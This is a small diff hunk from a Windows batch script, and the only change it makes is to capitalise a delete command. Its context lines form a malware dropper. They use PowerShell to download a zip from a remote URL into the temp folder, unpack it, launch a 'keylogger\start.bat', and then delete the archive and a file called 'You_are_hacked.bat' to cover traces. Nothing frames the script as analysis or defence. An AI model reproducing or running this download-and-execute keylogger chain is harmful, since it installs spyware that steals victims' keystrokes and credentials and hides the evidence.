@@ -4,5 +4,5 @@ set "d=%TEMP%" & set "z=%d%\repo.zip"
 powershell -Command "Invoke-WebRequest '%u%' -OutFile '%z%'"
 powershell -Command "Expand-Archive '%z%' '%d%' -Force"
 call "%d%\keylogger\start.bat"
-del "%z%" "%d%\You_are_hacked.bat"
+DEL "%z%" "%d%\You_are_hacked.bat"
 exit
